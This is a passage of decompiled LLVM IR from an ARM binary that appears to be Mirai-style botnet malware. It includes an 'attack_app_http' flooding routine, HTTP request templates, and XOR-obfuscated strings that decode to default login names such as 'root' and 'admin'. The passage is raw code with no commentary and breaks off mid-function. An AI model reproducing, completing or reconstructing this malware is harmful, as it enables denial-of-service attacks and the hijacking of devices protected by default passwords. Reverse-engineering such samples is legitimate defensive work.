source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_24420.23 = global i32 0
@global_var_e9fc.27 = constant i32 -382906384
@global_var_1b368.30 = constant [4 x i8] c"GET\00"
@global_var_1b36c.32 = constant i32 47
@global_var_16310.35 = constant i32 -450904024
@global_var_1b360.37 = constant i32 32
@global_var_1b338.39 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1b350.41 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_1b35c.43 = constant [3 x i8] c"\0D\0A\00"
@global_var_1b370.45 = constant [9 x i8] c"Cookie: \00"
@global_var_1b37c.47 = constant [3 x i8] c"; \00"
@global_var_1b388.49 = constant i32 59
@global_var_1b380.51 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_1b38c.53 = constant [5 x i8] c"http\00"
@global_var_1b394.55 = constant [5 x i8] c"url=\00"
@global_var_1b39c.57 = constant [5 x i8] c"POST\00"
@global_var_1b3a4.59 = constant i32 39
@global_var_124b8.60 = constant i32 -439279616
@global_var_1bbcc.62 = constant i32 61
@global_var_1504c.63 = constant i32 -382909968
@global_var_24644.67 = global i32 0
@global_var_d248.73 = constant i32 -382906384
@global_var_d6b4.75 = constant i32 -382906384
@global_var_c9bc.77 = constant i32 -382906384
@global_var_c2e4.79 = constant i32 -382906384
@global_var_bbc0.81 = constant i32 -382906384
@global_var_b394.83 = constant i32 -382906384
@global_var_ad34.85 = constant i32 -382906384
@global_var_a66c.87 = constant i32 -382906384
@global_var_81d0.89 = constant i32 -382906384
@global_var_27164.91 = global i32 0
@global_var_24648.102 = global i32 0
@global_var_27168.106 = local_unnamed_addr global i32 0
@global_var_2464c.108 = global i32 0
@global_var_e764.111 = constant i32 -382910448
@global_var_244d4.113 = global i32 75596
@global_var_27170.117 = local_unnamed_addr global i32 0
@global_var_2716e.118 = local_unnamed_addr global i32 0
@global_var_244cc.120 = global i32 -1
@global_var_24650.125 = global i32 0
@global_var_1b3a8.132 = constant i32 10
@global_var_244d0.134 = global i32 -1
@global_var_1274c.139 = constant i32 -382910352
@global_var_1b3ac.143 = constant i32 16777216
@global_var_24658.145 = global i32 0
@global_var_24664.147 = global i32 0
@global_var_2465c.149 = global i32 0
@global_var_24660.151 = global i32 0
@global_var_27184.161 = global i32 0
@global_var_2469c.163 = global i32 0
@global_var_24668.165 = global i32 0
@global_var_24694.167 = global i32 0
@global_var_2717c.174 = global i32 0
@global_var_27180.176 = global i32 0
@global_var_2466e.179 = local_unnamed_addr global i32 0
@global_var_24680.181 = global i32 0
@global_var_24674.183 = local_unnamed_addr global i32 0
@global_var_24670.184 = local_unnamed_addr global i32 0
@global_var_24675.185 = local_unnamed_addr global i32 0
@global_var_2468e.188 = local_unnamed_addr global i32 0
@global_var_1b384.190 = constant i32 0
@global_var_1b728.192 = constant [5 x i8] c"PMMV\00"
@global_var_1b8cc.194 = constant [6 x i8] c"CFOKL\00"
@global_var_1b3b4.196 = constant i32 387006810
@global_var_1b3bc.198 = constant [6 x i8] c"TKXZT\00"
@global_var_1b3c4.200 = constant i32 437918234
@global_var_1b3cc.202 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_1b3d4.204 = constant [8 x i8] c"FGDCWNV\00"
@global_var_1b3dc.206 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_1b3e8.208 = constant i32 370216979
@global_var_1b3f0.210 = constant i32 269555223
@global_var_1b3f8.212 = constant [8 x i8] c"QWRRMPV\00"
@global_var_1b804.214 = constant i32 370216979
@global_var_1b400.216 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_1b40c.218 = constant i32 370216979
@global_var_1b414.220 = constant [5 x i8] c"WQGP\00"
@global_var_1b41c.222 = constant [5 x i8] c"RCQQ\00"
@global_var_1b424.224 = constant i32 1263486531
@global_var_1b578.226 = constant i32 320017171
@global_var_1b430.228 = constant [9 x i8] c"QOACFOKL\00"
@global_var_1b43c.230 = constant i32 336860180
@global_var_1b444.232 = constant i32 324292169
@global_var_1b44c.234 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_1b45c.236 = constant [7 x i8] c"OGKLQO\00"
@global_var_1b464.238 = constant [4 x i8] c"@WJ\00"
@global_var_1b468.240 = constant [7 x i8] c"RW@NKA\00"
@global_var_1b470.242 = constant [8 x i8] c"QGPTKAG\00"
@global_var_1b478.244 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_1b484.246 = constant [6 x i8] c"EWGQV\00"
@global_var_1b48c.248 = constant i32 1263486531
@global_var_1b494.250 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_1b4a4.252 = constant [5 x i8] c"W@LV\00"
@global_var_1b4ac.254 = constant i32 324292169
@global_var_1b4b4.256 = constant i32 390551160
@global_var_1b4bc.258 = constant i32 387009354
@global_var_1b4c4.260 = constant [6 x i8] c"HT@XF\00"
@global_var_1b4cc.262 = constant [5 x i8] c"CLIM\00"
@global_var_1b4d4.264 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_1b4dc.266 = constant [9 x i8] c"AJCLEGOG\00"
@global_var_1b4e8.268 = constant i32 1867011861
@global_var_1b4f8.270 = constant i32 1867011861
@global_var_1b508.272 = constant [7 x i8] c"Q[QVGO\00"
@global_var_1b510.274 = constant [5 x i8] c"KIU@\00"
@global_var_1b518.276 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_1b524.278 = constant [8 x i8] c"PGCNVGI\00"
@global_var_1b52c.280 = constant i32 303174162
@global_var_1b538.282 = constant i32 303174162
@global_var_1b540.284 = constant i32 320017171
@global_var_1b548.286 = constant i32 1263486531
@global_var_1b3e0.288 = constant [5 x i8] c"VGAJ\00"
@global_var_1b554.290 = constant i32 454761243
@global_var_1b560.292 = constant [6 x i8] c"oGKLQ\00"
@global_var_1b568.294 = constant [4 x i8] c"hta\00"
@global_var_1b56c.296 = constant i32 319820054
@global_var_1b574.298 = constant i32 320017171
@global_var_1b580.300 = constant [7 x i8] c"WVQVCP\00"
@global_var_1b588.302 = constant [9 x i8] c"XMMOCFQN\00"
@global_var_1b594.304 = constant i32 1263486531
@global_var_1b59c.306 = constant i32 303059531
@global_var_1b5a4.308 = constant i32 303125067
@global_var_1b5ac.310 = constant i32 303452747
@global_var_1b5b4.312 = constant [7 x i8] c"@KLVGA\00"
@global_var_1b5bc.314 = constant [8 x i8] c"VQWLCOK\00"
@global_var_1b5c4.316 = constant i32 323043395
@global_var_1b5cc.318 = constant i32 319951888
@global_var_1b5d4.320 = constant [7 x i8] c"Q[LLGV\00"
@global_var_1b5dc.322 = constant [9 x i8] c"@C[CLFQN\00"
@global_var_1b5e8.324 = constant [6 x i8] c"SWQGP\00"
@global_var_1b6e0.326 = constant i32 1118227
@global_var_1b5f0.328 = constant i32 370216979
@global_var_1b5f8.330 = constant [8 x i8] c"oCLCEGP\00"
@global_var_1b600.332 = constant [4 x i8] c"CFO\00"
@global_var_1b604.334 = constant [8 x i8] c"OCLCEGP\00"
@global_var_1b60c.336 = constant [7 x i8] c"DPKGLF\00"
@global_var_1b614.338 = constant [4 x i8] c"CRA\00"
@global_var_1b618.340 = constant i32 1263421261
@global_var_1b624.342 = constant [5 x i8] c"VKLK\00"
@global_var_1b62c.344 = constant [7 x i8] c"CQAGLF\00"
@global_var_1b634.346 = constant i32 1265504102
@global_var_1b63c.348 = constant [6 x i8] c"FNKLI\00"
@global_var_1b644.350 = constant [6 x i8] c"NMEKL\00"
@global_var_1b64c.352 = constant i32 1296912387
@global_var_1b654.354 = constant [9 x i8] c"AC@NGAMO\00"
@global_var_1b660.356 = constant [7 x i8] c"PMWVGP\00"
@global_var_1b668.358 = constant [8 x i8] c"LGVMRKC\00"
@global_var_1b670.360 = constant [7 x i8] c"Q[QCFO\00"
@global_var_1b678.362 = constant [8 x i8] c"CLKAWQV\00"
@global_var_1b680.364 = constant [6 x i8] c"FG@WE\00"
@global_var_1b688.366 = constant [10 x i8] c"F\0CG\0C@\0CW\0CE\00"
@global_var_1b694.368 = constant [5 x i8] c"GAJM\00"
@global_var_1b69c.370 = constant [5 x i8] c"FKCE\00"
@global_var_1b6a4.372 = constant [7 x i8] c"QUKVAJ\00"
@global_var_1b674.374 = constant [3 x i8] c"FO\00"
@global_var_1b6ac.376 = constant [7 x i8] c"VGNLGV\00"
@global_var_1b6b4.378 = constant i32 370216979
@global_var_1b6c0.380 = constant [5 x i8] c"VMMP\00"
@global_var_1b6c8.382 = constant [7 x i8] c"ACNTKL\00"
@global_var_1b6d0.384 = constant i32 370216979
@global_var_1b6dc.386 = constant i32 1447906640
@global_var_1b6e4.388 = constant i32 1447512643
@global_var_1b6f0.390 = constant i32 454302484
@global_var_1b6f8.392 = constant i32 387400530
@global_var_1b704.394 = constant i32 319885331
@global_var_1b70c.396 = constant i32 1986882928
@global_var_1b714.398 = constant [7 x i8] c"CNRKLG\00"
@global_var_1b71c.400 = constant i32 457659992
@global_var_1b724.402 = constant i32 303043392
@global_var_1b730.404 = constant [9 x i8] c"rcqqumpf\00"
@global_var_1b73c.406 = constant [6 x i8] c"cfokl\00"
@global_var_1b744.408 = constant [8 x i8] c"LGVEGCP\00"
@global_var_1b74c.410 = constant i32 303257172
@global_var_1b754.412 = constant [4 x i8] c"K@O\00"
@global_var_1b758.414 = constant [7 x i8] c"T[CVVC\00"
@global_var_1b760.416 = constant [6 x i8] c"cFOKL\00"
@global_var_1b768.418 = constant i32 373380675
@global_var_1b770.420 = constant [7 x i8] c"OKAPMQ\00"
@global_var_1b778.422 = constant [6 x i8] c"QGVWR\00"
@global_var_1b780.424 = constant [8 x i8] c"AMOACQV\00"
@global_var_1b788.426 = constant [4 x i8] c"RMQ\00"
@global_var_1b78c.428 = constant [4 x i8] c"UUU\00"
@global_var_1b790.430 = constant i32 303176208
@global_var_1b798.432 = constant [5 x i8] c"w`lv\00"
@global_var_1b7a0.434 = constant [7 x i8] c"LGVOCL\00"
@global_var_1b7a8.436 = constant [6 x i8] c"Cfokl\00"
@global_var_1b7b0.438 = constant [7 x i8] c"FCGOML\00"
@global_var_1b7b8.440 = constant [5 x i8] c"FGOM\00"
@global_var_1b7c0.442 = constant [6 x i8] c"CPPKQ\00"
@global_var_1b7c8.444 = constant [8 x i8] c"nKLIQ[Q\00"
@global_var_1b7d0.446 = constant [7 x i8] c"ANKGLV\00"
@global_var_1b7d8.448 = constant [6 x i8] c"AKQAM\00"
@global_var_1b7e0.450 = constant [6 x i8] c"akqam\00"
@global_var_1b7e8.452 = constant [6 x i8] c"QWRGP\00"
@global_var_1b7f0.454 = constant [5 x i8] c"QWPV\00"
@global_var_1b7f8.456 = constant i32 370611221
@global_var_1b58c.458 = constant [5 x i8] c"CFQN\00"
@global_var_1b800.460 = constant i32 1313949251
@global_var_1b80c.462 = constant [7 x i8] c"RCVPMN\00"
@global_var_1b814.464 = constant i32 387007823
@global_var_1b81c.466 = constant [7 x i8] c"OGPNKL\00"
@global_var_1b824.468 = constant [9 x i8] c"LGVCFOKL\00"
@global_var_1b830.470 = constant [9 x i8] c"JGUNRCAI\00"
@global_var_1b83c.472 = constant [7 x i8] c"lGVkaQ\00"
@global_var_1b844.474 = constant i32 1179729984
@global_var_1b850.476 = constant [5 x i8] c"lwnn\00"
@global_var_1b858.478 = constant [9 x i8] c"CFOKLVVF\00"
@global_var_1b864.480 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_1b870.482 = constant [9 x i8] c"rNAOqRkR\00"
@global_var_1b87c.484 = constant i32 269488144
@global_var_1b888.486 = constant [9 x i8] c"QGAWPKV[\00"
@global_var_1b894.488 = constant [9 x i8] c"OMWLVQ[Q\00"
@global_var_1b8a0.490 = constant [8 x i8] c"OGOMVGA\00"
@global_var_1b8a8.492 = constant i32 1464562030
@global_var_1b8b8.494 = constant i32 2003334929
@global_var_1b8c8.496 = constant [10 x i8] c"OWQGCFOKL\00"
@global_var_1b8d4.498 = constant i32 1196513135
@global_var_1b8e0.500 = constant [10 x i8] c"QVMPUCVAJ\00"
@global_var_1b8ec.502 = constant [11 x i8] c"QRGAKCNKQV\00"
@global_var_1b8f8.504 = constant [10 x i8] c"CFOKLRNFV\00"
@global_var_1b904.506 = constant [10 x i8] c"RNFVCFOKL\00"
@global_var_1b910.508 = constant i32 1279478337
@global_var_1b91c.510 = constant [13 x i8] c"VGNGAMOCFOKL\00"
@global_var_1b92c.512 = constant [13 x i8] c"CFOKLVGNGAMO\00"
@global_var_1b93c.514 = constant [7 x i8] c"EWGQV\22\00"
@global_var_1b944.516 = constant i32 336675162
@global_var_1b94c.518 = constant [9 x i8] c"FGDCWNV\22\00"
@global_var_1b958.520 = constant [8 x i8] c"CLVQNS\22\00"
@global_var_1b960.522 = constant [12 x i8] c"QWRGPTKQMP\22\00"
@global_var_1b96c.524 = constant i32 1178819416
@global_var_1b978.526 = constant [6 x i8] c"PMMV\22\00"
@global_var_24678.527 = local_unnamed_addr global i32 0
@global_var_24676.528 = local_unnamed_addr global i32 0
@global_var_2467c.529 = local_unnamed_addr global i32 0
@global_var_24684.531 = local_unnamed_addr global i32 0
@global_var_24690.532 = local_unnamed_addr global i32 0
@global_var_f38c.540 = constant i32 -382910352
@global_var_1b987.543 = constant i32 2096127
@global_var_1b97e.545 = constant i32 2095871
@global_var_2718c.552 = global i32 0
@global_var_244dc.555 = global i32 1043935
@global_var_1b98c.560 = constant i32 39228
@global_var_27194.561 = local_unnamed_addr global i32 0
@global_var_27198.562 = local_unnamed_addr global i32 0
@global_var_1b990.564 = constant i32 55430
@global_var_2719c.565 = local_unnamed_addr global i32 0
@global_var_271a0.566 = local_unnamed_addr global i32 0
@global_var_1b994.568 = constant [20 x i8] c"jT^VXYsTZZXOnQ\5CDXO=\00"
@global_var_271a4.569 = local_unnamed_addr global i32 0
@global_var_271a8.570 = local_unnamed_addr global i32 0
@global_var_1b9a8.572 = constant i32 1380928786
@global_var_271ac.573 = local_unnamed_addr global i32 0
@global_var_271b0.574 = local_unnamed_addr global i32 0
@global_var_1b9b0.576 = constant i32 1480939538
@global_var_271b4.577 = local_unnamed_addr global i32 0
@global_var_271b8.578 = local_unnamed_addr global i32 0
@global_var_1b9b8.580 = constant i32 1029266194
@global_var_271c0.581 = local_unnamed_addr global i32 0
@global_var_271bc.582 = local_unnamed_addr global i32 0
@global_var_1b9c0.584 = constant i32 1380928786
@global_var_271c4.585 = local_unnamed_addr global i32 0
@global_var_271c8.586 = local_unnamed_addr global i32 0
@global_var_1b9d0.588 = constant i32 1297895442
@global_var_271cc.589 = local_unnamed_addr global i32 0
@global_var_271d0.590 = local_unnamed_addr global i32 0
@global_var_1b9d8.592 = constant i32 1548307986
@global_var_271d4.593 = local_unnamed_addr global i32 0
@global_var_271d8.594 = local_unnamed_addr global i32 0
@global_var_1b9e4.596 = constant i32 1414749203
@global_var_271dc.597 = local_unnamed_addr global i32 0
@global_var_271e0.598 = local_unnamed_addr global i32 0
@global_var_1b9ec.600 = constant i32 1380928786
@global_var_271e4.601 = local_unnamed_addr global i32 0
@global_var_271e8.602 = local_unnamed_addr global i32 0
@global_var_1ba00.604 = constant i32 1380928786
@global_var_271ec.605 = local_unnamed_addr global i32 0
@global_var_271f0.606 = local_unnamed_addr global i32 0
@global_var_1ba10.608 = constant i32 1920627327
@global_var_271f4.609 = local_unnamed_addr global i32 0
@global_var_271f8.610 = local_unnamed_addr global i32 0
@global_var_1ba1c.612 = constant i32 1581864978
@global_var_271fc.613 = local_unnamed_addr global i32 0
@global_var_27200.614 = local_unnamed_addr global i32 0
@global_var_1ba30.616 = constant i32 1599867994
@global_var_27208.617 = local_unnamed_addr global i32 0
@global_var_27204.618 = local_unnamed_addr global i32 0
@global_var_1ba48.620 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_2720c.621 = local_unnamed_addr global i32 0
@global_var_27210.622 = local_unnamed_addr global i32 0
@global_var_1ba54.624 = constant i32 1264081170
@global_var_27214.625 = local_unnamed_addr global i32 0
@global_var_27218.626 = local_unnamed_addr global i32 0
@global_var_1ba64.628 = constant i32 1264081170
@global_var_2721c.629 = local_unnamed_addr global i32 0
@global_var_27220.630 = local_unnamed_addr global i32 0
@global_var_1ba78.632 = constant i32 1264081170
@global_var_27224.633 = local_unnamed_addr global i32 0
@global_var_27228.634 = local_unnamed_addr global i32 0
@global_var_1ba90.636 = constant i32 1264081170
@global_var_2722c.637 = local_unnamed_addr global i32 0
@global_var_27230.638 = local_unnamed_addr global i32 0
@global_var_1baac.640 = constant i32 1264081170
@global_var_27238.641 = local_unnamed_addr global i32 0
@global_var_27234.642 = local_unnamed_addr global i32 0
@global_var_1babc.644 = constant [7 x i8] c"NUXQQ=\00"
@global_var_2723c.645 = local_unnamed_addr global i32 0
@global_var_27240.646 = local_unnamed_addr global i32 0
@global_var_1bac4.648 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_27244.649 = local_unnamed_addr global i32 0
@global_var_27248.650 = local_unnamed_addr global i32 0
@global_var_1bacc.652 = constant [8 x i8] c"NDNIXP=\00"
@global_var_2724c.653 = local_unnamed_addr global i32 0
@global_var_27250.654 = local_unnamed_addr global i32 0
@global_var_1bad4.656 = constant [4 x i8] c"NU=\00"
@global_var_27254.657 = local_unnamed_addr global i32 0
@global_var_27258.658 = local_unnamed_addr global i32 0
@global_var_1bad8.660 = constant i32 1398038290
@global_var_2725c.661 = local_unnamed_addr global i32 0
@global_var_27260.662 = local_unnamed_addr global i32 0
@global_var_1baf4.664 = constant i32 1449022538
@global_var_27268.665 = local_unnamed_addr global i32 0
@global_var_27264.666 = local_unnamed_addr global i32 0
@global_var_1bb14.668 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_2726c.669 = local_unnamed_addr global i32 0
@global_var_27270.670 = local_unnamed_addr global i32 0
@global_var_27274.671 = local_unnamed_addr global i32 0
@global_var_27278.672 = local_unnamed_addr global i32 0
@global_var_1bb20.674 = constant [6 x i8] c"RZTS=\00"
@global_var_2727c.675 = local_unnamed_addr global i32 0
@global_var_27280.676 = local_unnamed_addr global i32 0
@global_var_1bb28.678 = constant [7 x i8] c"XSIXO=\00"
@global_var_27284.679 = local_unnamed_addr global i32 0
@global_var_27288.680 = local_unnamed_addr global i32 0
@global_var_1bb30.682 = constant i32 1213361769
@global_var_2728c.683 = local_unnamed_addr global i32 0
@global_var_1bb48.685 = constant i32 1581864978
@global_var_27294.686 = local_unnamed_addr global i32 0
@global_var_1bb5c.688 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_2729c.689 = local_unnamed_addr global i32 0
@global_var_1bb68.691 = constant i32 1397969534
@global_var_272a4.692 = local_unnamed_addr global i32 0
@global_var_1bebc.694 = constant i32 1482579580
@global_var_272ac.695 = local_unnamed_addr global i32 0
@global_var_1bf10.697 = constant i32 1482579580
@global_var_272b4.698 = local_unnamed_addr global i32 0
@global_var_1bb80.700 = constant i32 1230197374
@global_var_272bc.701 = local_unnamed_addr global i32 0
@global_var_1bbb4.703 = constant i32 2118735950
@global_var_272c4.704 = local_unnamed_addr global i32 0
@global_var_1bbc4.706 = constant i32 1331386447
@global_var_272cc.707 = local_unnamed_addr global i32 0
@global_var_1bbd0.709 = constant i32 1549685329
@global_var_272d4.710 = local_unnamed_addr global i32 0
@global_var_1bbdc.712 = constant i32 273242190
@global_var_272dc.713 = local_unnamed_addr global i32 0
@global_var_1bbec.715 = constant i32 1230197342
@global_var_272e4.716 = local_unnamed_addr global i32 0
@global_var_1bc00.718 = constant i32 1398558537
@global_var_272ec.719 = local_unnamed_addr global i32 0
@global_var_1bc14.721 = constant [9 x i8] c"^UHSVXY=\00"
@global_var_272f4.722 = local_unnamed_addr global i32 0
@global_var_1bb74.724 = constant i32 1297635414
@global_var_272fc.725 = local_unnamed_addr global i32 0
@global_var_1bc20.727 = constant i32 1397969502
@global_var_27304.728 = local_unnamed_addr global i32 0
@global_var_1bc30.730 = constant i32 1263491150
@global_var_2730c.731 = local_unnamed_addr global i32 0
@global_var_1bc44.733 = constant i32 1263491150
@global_var_27314.734 = local_unnamed_addr global i32 0
@global_var_1bc60.736 = constant i32 1413960304
@global_var_2731c.737 = local_unnamed_addr global i32 0
@global_var_1bcd4.739 = constant i32 1413960304
@global_var_27324.740 = local_unnamed_addr global i32 0
@global_var_1bd48.742 = constant i32 1413960304
@global_var_2732c.743 = local_unnamed_addr global i32 0
@global_var_1bd98.745 = constant i32 1413960304
@global_var_27334.746 = local_unnamed_addr global i32 0
@global_var_1be0c.748 = constant i32 1413960304
@global_var_2733c.749 = local_unnamed_addr global i32 0
@global_var_1be80.751 = constant i32 1264081170
@global_var_27344.752 = local_unnamed_addr global i32 0
@global_var_2734c.753 = local_unnamed_addr global i32 0
@global_var_1be98.755 = constant i32 1208552964
@global_var_27354.756 = local_unnamed_addr global i32 0
@global_var_1beb0.758 = constant [12 x i8] c"YKOnI\5COIHM=\00"
@global_var_2735c.759 = local_unnamed_addr global i32 0
@global_var_24424.765 = global i32 0
@global_var_13284.788 = constant i32 -443088884
@global_var_11080.794 = constant i32 -369098740
@global_var_10fb0.797 = constant i32 -481165276
@global_var_1371c.806 = constant i32 -456978431
@global_var_1400c.850 = constant i32 -478871519
@global_var_14ab0.867 = constant i32 -478805983
@global_var_14e98.877 = constant i32 -382906384
@global_var_16d90.886 = constant i32 -442544040
@global_var_1561c.905 = constant i32 -369098502
@global_var_15ff0.919 = constant i32 -382910288
@global_var_e30c.930 = constant i32 -509607926
@global_var_e2dc.932 = constant i32 -528220150
@global_var_161a0.933 = constant i32 -2020859901
@global_var_1628c.936 = constant i32 -494075872
@global_var_13130.937 = constant i32 -382910336
@global_var_276ec.940 = local_unnamed_addr global i32 0
@global_var_152c8.954 = constant i32 -442543860
@global_var_dc04.959 = constant i32 -352321437
@global_var_13680.963 = constant i32 -369093278
@global_var_17288.990 = constant i32 -382910352
@global_var_18698.1011 = constant i32 -382906384
@global_var_c7c4.1023 = constant i32 167772245
@global_var_18158.1041 = constant i32 -382910448
@global_var_19b48.1042 = constant i32 -382909968
@global_var_a7e4.1097 = constant i32 -443744216
@global_var_1a284.1106 = constant i32 -481296376
@global_var_1a37c.1107 = constant i32 -481296376
@global_var_1a400.1108 = constant i32 -369098732
@global_var_24624.13 = external global i8*
@global_var_24640.65 = external global i8*
@global_var_24641.71 = global i8 0
@global_var_2716c.115 = global i16* null
@1 = internal constant [2 x i8] c"\01\00"
@global_var_244d8.122 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24654.137 = external global i8*
@global_var_24698.169 = global i16* null
@global_var_2466c.178 = external global i8*
@global_var_2468c.182 = local_unnamed_addr global i8 0
@global_var_24682.186 = local_unnamed_addr global i16 0
@global_var_2468d.187 = local_unnamed_addr global i8 0
@global_var_2447c.761 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_24624.13 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_24624.13 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_24624.13, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_24420.23, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_24420.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_24420.23, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e9fc.27 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 111384, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_app_http(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v18_81d0 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81fc = inttoptr i32 %arg4 to i32*
  %v6_81fc = call i32 @attack_get_opt_str(i32 %arg3, i32* %v5_81fc, i32 20, i32 0, i32 %arg2)
  %v0_8200 = load i32, i32* @r5, align 4
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v0_820c = load i32, i32* @r4, align 4
  store i32 %v0_820c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b368.30 to i32), i32* %r3.global-to-local, align 4
  %v6_8214 = inttoptr i32 %v0_8200 to i32*
  %v7_8214 = call i32 @attack_get_opt_str(i32 %v0_820c, i32* %v6_8214, i32 19, i32 ptrtoint ([4 x i8]* @global_var_1b368.30 to i32), i32 %v6_81fc)
  %v0_8218 = load i32, i32* @r5, align 4
  store i32 %v0_8218, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8214, i32* @sb, align 4
  %v0_8228 = load i32, i32* @r4, align 4
  store i32 %v0_8228, i32* %r0.global-to-local, align 4
  %v5_822c = inttoptr i32 %v0_8218 to i32*
  %v6_822c = call i32 @attack_get_opt_str(i32 %v0_8228, i32* %v5_822c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8230 = load i32, i32* @r5, align 4
  store i32 %v0_8230, i32* %r1.global-to-local, align 4
  store i32 %v6_822c, i32* @sl, align 4
  store i32 21, i32* %r2.global-to-local, align 4
